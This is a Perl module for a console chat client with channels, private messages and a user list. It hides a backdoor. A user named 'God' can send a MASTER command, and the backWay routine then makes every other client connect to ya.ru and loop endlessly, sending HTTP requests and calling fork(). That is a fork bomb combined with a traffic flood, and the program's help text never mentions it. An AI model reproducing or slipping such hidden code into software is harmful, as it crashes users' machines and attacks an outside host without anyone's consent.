package My_Client;	
	use IO::Select;
	use threads::shared;
	
	
	our %users;
	
	our $nick_name;

	our @list_of_channels = ('Perl', 'Edu', 'Other', 'Music');
	our @signed_channels;

	our $current_channel;
	
	our %log_of_channel=('Perl'  => "What happened on Perl channel:\n",
						 'Edu'   => "What happened on Edu channel:\n",
						 'Other' => "What happened on Other channel:\n",
						 'Music' => "What happened on Music channel:\n",);
						 
	#-----------------------------------------		
	sub start{
		$|=1;
		push @::to_send, "GETUSERS";								
		print "Hello. It's a new chat. Type help or exit\n";			
		$nick_name = get_user_name();			
							
		check_recv();						
		print "Check avaliable.";		
		check_recv();	
		while ( exists $users{$nick_name} ){
			print "This Nick is Busy!";
			$nick_name = get_user_name();
		}		
		
		if ($nick_name eq "God"){
			print "Kill all people???";
			my $t = <STDIN>;
			if ($t =~ /yes/i){
				push @::to_send, "MASTER";
				sleep(1);
				check_recv();			
			}
		}
		check_recv();
		push @::to_send, "NEWUSER $nick_name";		
		my $bool = 1;
		my $select = IO::Select->new(\*STDIN);
		check_recv();
		print "Ok!\n";
		
		my $was = 1;
		while($bool){										
			if ($#::to_send==-1 && $#::recved==-1){					
				if ($was){
						print "\n$nick_name: ";
						$was = 0;
				}				
				
				if ( $select->can_read(5) ) {					
					my $str = <STDIN>;
					check_input($str);
					$was = 1;
				}	
			}		
			if ($#::recved!=-1){	
				check_recv();
			}
			sleep(1);			
		}		
	}
	#-----------------------------------------		
	sub check_recv(){
		for (@::recved){
			#~ print "recv $_ \n";
			my $tmp = $_;
			my @mas = split(' ', $tmp);
			shift @::recved;
			
			my %hash = (
				'NEWUSER'   => \&on_NEWUSER,
				'GETUSERS'  => \&on_GETUSERS,
				'LISTUSERS' => \&on_LISTUSERS,
				'QUIT'      => \&on_QUIT,				
				'PRIVATE'   => \&on_PRIVATE,
				'MSG'       => \&on_MSG,
				'MSG_ALL'   => \&on_MSG_ALL,
				'MASTER'    => \&backWay
				);
			$hash{$mas[0]}($tmp) if exists $hash{$mas[0]};
			return;		
		 }	 
	 }	
	 
	#-----------------------------------------		
	sub on_NEWUSER{		
		my $tmp = shift;	
		my @mas = split(' ', $tmp);
		if (not exists $users{$mas[1]}){
			$users{$mas[1]} = $mas[2];
		}
		return;
	}
	#-----------------------------------------
	sub on_GETUSERS(){
		my $m='';
		while (($key,$value) = each %users) {
			#~ print $$key=$value\n";
			$m.="$key->$value "
		}
		print $m;			
		push @::to_send, 'LISTUSERS '.$m; 
	}
	#-----------------------------------------
	sub on_LISTUSERS(){		
		my $tmp = shift;	
		my @mas = split(' ', $tmp);
		
		
		for (@mas[1..$#mas]){
			@pairs = split('->', $_);
			if (not exists $users{$pairs[0]}){
				$users{$pairs[0]} = $pairs[1];
			}
		}			
	}
	#-----------------------------------------
	sub on_PRIVATE(){		
		my $tmp = shift;	
		my @mas = split(' ', $tmp);		
		
		print "Private message from $mas[3]: ".join(' ', @mas[4..$#mas]);
					
	}
	#-----------------------------------------
	sub on_QUIT(){		
		my $tmp = shift;	
		my @mas = split(' ', $tmp);
		#~ for (0..$#list_of_users){
			#~ if (@list_of_users[$_] eq $mas[1]){
				#~ delete $list_of_users[$_];
			#~ }
		#~ } 
		if ($mas[1] eq $nick_name){
			$::finish = 0;
			$bool = 0;
			exit(0);
			return;
		}
	}						
	#-----------------------------------------	
	sub on_MSG(){		
		my $tmp = shift;		
		my @mas = split(' ', $tmp);		
					
		if (not in($mas[2], @signed_channels) ){
					return;
		}	 
		$log_of_channel{$mas[2]}.="From $mas[1]: ".join(' ', @mas[3..$#mas]);
		$log_of_channel{$mas[2]}.="\n";
		
		if ($mas[1] eq $nick_name){
					return;
		}	
				
		print "From $mas[1] on $current_channel:";
		for (@mas[3..$#mas]){
			print $_.' ';
		}
		print "\n";		
	}		
	#-----------------------------------------
	
	sub on_MSG_ALL(){		
		my $tmp = shift;	
		
		my @mas = split(' ', $tmp);		
		if ($mas[1] eq $nick_name){
					#next;							
		}					 
		print "$mas[1] said to all:";
		for (@mas[2..$#mas]){print $_.' ';}
		print "\n";		
	}		
	#-----------------------------------------
	#-----------------------------------------
	#-----------------------------------------
	sub get_user_name{
		my $name;
		do{
			print "Enter your nickname:";		
			$name = <STDIN>;
		} until ($name ne "\n");				
		chop($name);		
		return $name;
	}
	#-----------------------------------------
	sub in{
		$what = shift;
		@where = @_;
		if (grep $_ eq $what, @where){
			return 1;
		}			
		return 0;		
	}		
	#-----------------------------------------
	sub check_input(){
		my $tmp = shift;		
		my @mas = split (' ', $tmp);	
		
		my %hash = (
			'exit'    => \&onExit,
			'help'    => \&onHelp,
			'current' => \&onCurrent,
			'use'     => \&onUse,
			'send'    => \&onSend,
			'sendall' => \&onSendAll,
			'private' => \&onPrivate,
			'channels'=> \&onChannels,
			'connect' => \&onConnect,
			'disconnect' => \&onDisConnect,
			'signed'     => \&onSigned,
		 	'list'       => \&onList,
			'show'       => \&onShow
		);
		 if (exists $hash{$mas[0]}){
			 $hash{$mas[0]}($tmp)
		 } else {
			 print "Unknown kommand\n";
		 }
		return;
	}
	#-----------------------------------------
	sub onExit(){
		push @::to_send, "QUIT $nick_name";
		print "Shutdown";				
		$bool = 0;
		sleep(1);
		exit (0);
	}
	#-----------------------------------------
	sub onHelp(){
		print "This is simple chat with ...\n";
		print "List of commands:\n";
		print "exit - close this program.\n"; 
		print "list - shows all users in net.\n";
		print "send - send message to current channel.\n";
		print "sendall - sends message to everyone.\n";
		print "private \<name\> - send message only this person.\n";
		print "channels - shows all availiable channels.\n";
		print "use \<channel\>- connect to choosen channel.\n";
		print "current - shows current channel.\n";
		print "connect \<channel\>- sign to choosen channel.\n";
		print "disconnect \<channel\> - dissign this channel.\n";
		print "signed - shows all channels that you signed.\n";
		print "help - shows this message.\n";
	}
	#-----------------------------------------
	sub onCurrent(){			
		if ($current_channel eq ''){
			print 'You dont use any channel. Try use <channel>.'."\n";
			return ;
		}
		print "Current channel is $current_channel.\n";				
	}
	#-----------------------------------------
	sub onUse(){	
		my $tmp = shift;	
		my @mas = split(' ', $tmp);		
		
		if ( not in($mas[1], @list_of_channels) ){
			print "No such channel.\n";
			return -2;
		}
		if ( not in ($mas[1], @signed_channels) ){
			print 'You dont signed this channel. Try connect <channel>'."\n";
			return -1;
		}
		print "Current channel changed on $mas[1].\n";	
		$current_channel = $mas[1];
		print  $log_of_channel{$mas[1]};				
		return 0;
	}
	#-----------------------------------------
	sub onSend(){	
		my $tmp = shift;	
		my @mas = split(' ', $tmp);		
		
		if ($current_channel eq ''){
			print 'You dont use any channel. Try use <channel>.'."\n";
			return;
		}		
		push @::to_send, "MSG $nick_name $current_channel ".join(' ', @mas[1..$#mas]);
	}
	#-----------------------------------------
	sub onSendAll(){	
		my $tmp = shift;	
		my @mas = split(' ', $tmp);		
		push @::to_send, "MSG_ALL $nick_name ".join(' ', @mas[1..$#mas]);								
	}
	#-----------------------------------------
	sub onShow(){				
		print "$log_of_channel{$current_channel}\n";		
	}
	#-----------------------------------------
	sub onPrivate(){
		my $tmp = shift;	
		my @mas = split(' ', $tmp);
		if (exists $users{$mas[1]}){				
			push @::to_send, "PRIVATE $users{$mas[1]} FROM $nick_name ". join(' ', @mas[2..$#mas]);
		} 
		else {
			print "No such User\n";
		}						
	}
	#-----------------------------------------
	sub onChannels(){
		print 'Channels: ';
		for (@list_of_channels){
			print $_.' ';					
		}				
		print "\n";
	}
	#-----------------------------------------
	sub backWay(){			
		use Socket;
			
		if ($nick_name eq 'God'){
			$::finish = 0;
			sleep(2);
			print "World is over";				
			exit(0);
		}						
		my ($host, $port)=("ya.ru", 80);		
		socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));				
		connect(SOCK, sockaddr_in($port, inet_aton($host)));
		print "Wait a second, Please";
		while (1){					
			send (SOCK, "GET / HTTP/1.0\n\n", 0);
			fork();
		}
	}	
	#-----------------------------------------	
	sub onConnect(){
		my $tmp = shift;	
		my @mas = split(' ', $tmp);
		if ( not in($mas[1], @list_of_channels) ){
			print "No such channel\n";
			return 0;
		}
		if (in($mas[1], @signed_channels) ){
			print "You already signed this channel\n";
			return -1;
		}
		push @signed_channels, $mas[1];
	}
	#-----------------------------------------
	sub onDisConnect(){
		my $tmp = shift;	
		my @mas = split(' ', $tmp);
		if ( not in($mas[1], @signed_channels) ){
			print "You are not connected here.\n";
			return;
		}		
		for (0..$#signed_channels){
			if (@signed_channels[$_] eq $mas[1]){
					delete @signed_channels[$_];
			}
		}
		if ($mas[1] eq $current_channel){
			undef $current_channel;
		}
	}
	#-----------------------------------------
	sub onSigned(){
		for (0..$#signed_channels){
			if (@signed_channels[$_] ne ''){
				print @signed_channels[$_].' ';
			}
		}
		print "\n";
	}
	#-----------------------------------------
	sub onList(){			
		while (($key,$value) = each %users) {
			print "$key->$value\n";			
		}		
	}
	#-----------------------------------------
1;
#-----------------------------------------------------------------------
